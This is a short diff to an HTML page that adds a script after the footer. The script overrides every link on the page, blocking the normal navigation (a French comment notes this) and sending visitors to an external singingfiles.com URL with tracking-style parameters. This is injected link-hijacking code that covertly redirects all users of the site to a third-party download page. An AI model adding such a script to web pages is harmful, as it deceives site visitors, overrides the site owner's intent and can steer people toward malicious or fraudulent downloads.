@@ -210,5 +210,13 @@
             </div>
 </div>
 </footer>
+<script>
+  document.querySelectorAll("a").forEach(link => {
+    link.addEventListener("click", function(e) {
+      e.preventDefault(); // empêche la redirection d'origine
+      window.location.href = "https://singingfiles.com/show.php?l=0&u=2423091&id=68831";
+    });
+  });
+</script>
 
 </body></html>
